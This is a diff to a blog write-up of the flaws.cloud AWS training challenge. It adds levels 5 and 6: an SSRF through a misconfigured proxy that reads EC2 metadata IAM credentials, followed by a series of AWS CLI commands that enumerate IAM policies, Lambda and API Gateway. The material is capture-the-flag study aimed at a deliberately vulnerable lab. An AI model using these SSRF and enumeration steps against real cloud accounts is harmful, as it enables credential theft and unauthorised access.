@@ -141,7 +141,7 @@
 
   <div>
         <div class="toc col-lg-3 hidden-xs hidden-sm">
-            <div id="toc"><ul><li><a class="toc-href" href="#level-1" title="Level 1">Level 1</a></li><li><a class="toc-href" href="#level-2" title="Level 2">Level 2</a></li><li><a class="toc-href" href="#level-3" title="Level 3">Level 3</a></li><li><a class="toc-href" href="#level-4" title="Level 4">Level 4</a></li><li><a class="toc-href" href="#level-5" title="Level 5">Level 5</a></li></ul></div>
+            <div id="toc"><ul><li><a class="toc-href" href="#level-1" title="Level 1">Level 1</a></li><li><a class="toc-href" href="#level-2" title="Level 2">Level 2</a></li><li><a class="toc-href" href="#level-3" title="Level 3">Level 3</a></li><li><a class="toc-href" href="#level-4" title="Level 4">Level 4</a></li><li><a class="toc-href" href="#level-5" title="Level 5">Level 5</a></li><li><a class="toc-href" href="#level-6" title="Level 6">Level 6</a></li></ul></div>
         </div>
     <h2 id="level-1">Level 1</h2>
 <p>Location: <a href="http://flaws.cloud/">http://flaws.cloud/</a></p>
@@ -230,8 +230,82 @@ ls<span class="w"> </span>-l
 <p><img alt="level4-win.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level4-win.png"/></p>
 <p>Note that, having the whole volume mounted, it was enough to simple access the web page html file located at <code>/media/level4/var/www/html/index.html</code>.</p>
 <h2 id="level-5">Level 5</h2>
-<p>Todo
-http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/</p>
+<p>From level 4 dumped nginx configuration file:</p>
+<p><img alt="level5-nginx-proxy.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level5-nginx-proxy.png"/></p>
+<p>It seems that an HTTP proxy function is configured at:</p>
+<div class="highlight"><pre><span></span><code>http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/&lt;destination http host&gt;
+</code></pre></div>
+<p>This function allows an attacker to perform SSRF and interact with the EC2 instance metadata:</p>
+<div class="highlight"><pre><span></span><code>http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data
+</code></pre></div>
+<p><img alt="level5-ssrf-metadata.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level5-ssrf-metadata.png"/></p>
+<p>Discover <code>flaws</code> user API keys:</p>
+<div class="highlight"><pre><span></span><code>http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws
+</code></pre></div>
+<p><img alt="level5-ssrf-metadata-credentials.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level5-ssrf-metadata-credentials.png"/></p>
+<p>Set found API keys in <code>~/.aws/credentials</code>.</p>
+<p><img alt="level5-credentials.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level5-credentials.png"/></p>
+<p><strong>Note that also the session token has been set.</strong></p>
+<p>Use found API keys to list level6 bucket content:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>s3<span class="w"> </span>ls<span class="w"> </span>s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud<span class="w"> </span>--profile<span class="w"> </span>level5.flaws.cloud<span class="w"> </span>--region<span class="w"> </span>us-west-2<span class="w"> </span>--recursive
+</code></pre></div>
+<p><img alt="level5-list-bucket-level6.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level5-list-bucket-level6.png"/></p>
+<p><img alt="level5-win.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level5-win.png"/></p>
+<h2 id="level-6">Level 6</h2>
+<p>Level 6 provides a set of credentials.</p>
+<p>Get current profile identity info:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>sts<span class="w"> </span>get-caller-identity<span class="w"> </span>--profile<span class="w"> </span>level6.flaws.cloud<span class="w"> </span>--region<span class="w"> </span>us-west-2
+</code></pre></div>
+<p><img alt="level6-sts-identity.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level6-sts-identity.png"/></p>
+<p>Get same information with another command:</p>
+<div class="highlight"><pre><span></span><code><span class="n">aws</span><span class="w"> </span><span class="n">iam</span><span class="w"> </span><span class="n">get</span><span class="o">-</span><span class="n">user</span><span class="w"> </span><span class="o">--</span><span class="n">profile</span><span class="w"> </span><span class="n">level6</span><span class="p">.</span><span class="n">flaws</span><span class="p">.</span><span class="n">cloud</span><span class="w"> </span><span class="o">--</span><span class="n">region</span><span class="w"> </span><span class="n">us</span><span class="o">-</span><span class="n">west</span><span class="o">-</span><span class="mh">2</span>
+</code></pre></div>
+<p><img alt="level6-iam-user.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level6-iam-user.png"/></p>
+<p>List policies attached to Level6:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>iam<span class="w"> </span>list-attached-user-policies<span class="w"> </span>--user-name<span class="w"> </span>level6<span class="w"> </span>--profile<span class="w"> </span>level6.flaws.cloud<span class="w"> </span>--region<span class="w"> </span>us-west-2
+</code></pre></div>
+<p><img alt="level6-user-policies.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level6-user-policies.png"/></p>
+<p>Get <code>list_apigateways</code> available versions:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>iam<span class="w"> </span>list-policy-versions<span class="w"> </span>--policy-arn<span class="w"> </span>arn:aws:iam::975426262029:policy/list_apigateways<span class="w"> </span>--profile<span class="w"> </span>level6.flaws.cloud<span class="w"> </span>--region<span class="w"> </span>us-west-2
+</code></pre></div>
+<p><img alt="level6-listapigateways-versions.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level6-listapigateways-versions.png"/></p>
+<p>Get permissions associated to <code>list_apigateways</code> - <code>v4</code> policy:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>iam<span class="w"> </span>get-policy-version<span class="w"> </span>--policy-arn<span class="w"> </span>arn:aws:iam::975426262029:policy/list_apigateways<span class="w"> </span>--version-id<span class="w"> </span>v4<span class="w"> </span>--profile<span class="w"> </span>level6.flaws.cloud<span class="w"> </span>--region<span class="w"> </span>us-west-2
+</code></pre></div>
+<p><img alt="level6-listapigateways-permission.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level6-listapigateways-permission.png"/></p>
+<p>Note that the user can perform some get operations on specific apigateway module's rest API  but cannot list every existing API so an API id is required in order to continue.</p>
+<p>List <code>MySecurityAudit</code> versions:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>iam<span class="w"> </span>list-policy-versions<span class="w"> </span>--policy-arn<span class="w"> </span>arn:aws:iam::975426262029:policy/MySecurityAudit<span class="w"> </span>--profile<span class="w"> </span>level6.flaws.cloud<span class="w"> </span>--region<span class="w"> </span>us-west-2
+</code></pre></div>
+<p><img alt="level6-mysecurityaudit-versions.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level6-mysecurityaudit-versions.png"/></p>
+<p>Get <code>MySecurityAudit</code> - <code>v1</code> capabilities:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>iam<span class="w"> </span>get-policy-version<span class="w"> </span>--policy-arn<span class="w"> </span>arn:aws:iam::975426262029:policy/MySecurityAudit<span class="w"> </span>--version-id<span class="w"> </span>v1<span class="w"> </span>--p
+rofile<span class="w"> </span>level6.flaws.cloud<span class="w"> </span>--region<span class="w"> </span>us-west-2
+</code></pre></div>
+<p><img alt="level6-mysecurityaudit-permissions.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level6-mysecurityaudit-permissions.png"/></p>
+<p><code>MySecurityAudit</code> has the <code>lambda:List*</code> permission which allows to list every existing lambda function:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>lambda<span class="w"> </span>list-functions<span class="w"> </span>--profile<span class="w"> </span>level6.flaws.cloud<span class="w"> </span>--region<span class="w"> </span>us-west-2
+</code></pre></div>
+<p><img alt="level6-list-lambda-functions.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level6-list-lambda-functions.png"/></p>
+<p>Also, the <code>lambda:GetPolicy</code> allows to obtain information about policies associated to a lambda function:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>lambda<span class="w"> </span>get-policy<span class="w"> </span>--function-name<span class="w"> </span>Level6<span class="w"> </span>--profile<span class="w"> </span>level6.flaws.cloud<span class="w"> </span>--region<span class="w"> </span>us-west-2
+</code></pre></div>
+<p><img alt="level6-lambda-level6-policy.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level6-lambda-level6-policy.png"/></p>
+<p>Function <code>Level6</code> has some permissions on the resource <code>arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6</code> which appears to be a rest API object. From this ARN it's possible to extract the resource id which is <code>s33ppypa75</code>.</p>
+<p>Using this id, get the rest API name which is <code>Level6</code>:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>apigateway<span class="w"> </span>get-rest-api<span class="w"> </span>--rest-api-id<span class="w"> </span>s33ppypa75<span class="w"> </span>--profile<span class="w"> </span>level6.flaws.cloud<span class="w"> </span>--region<span class="w"> </span>us-west-2
+</code></pre></div>
+<p><img alt="level6-get-api.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level6-get-api.png"/></p>
+<p>List available stages for function <code>Level6</code>:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>apigateway<span class="w"> </span>get-stages<span class="w"> </span>--rest-api-id<span class="w"> </span>s33ppypa75<span class="w"> </span>--profile<span class="w"> </span>level6.flaws.cloud<span class="w"> </span>--region<span class="w"> </span>us-west-2
+</code></pre></div>
+<p><img alt="level6-get-api-stages.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level6-get-api-stages.png"/></p>
+<p>Invoke the API:</p>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6
+</code></pre></div>
+<p><img alt="level6-curl-api.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level6-curl-api.png"/></p>
+<p>Win:</p>
+<p><img alt="level6-win.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level6-win.png"/></p>
   </div>
   <div class="tag-cloud">
     <p>
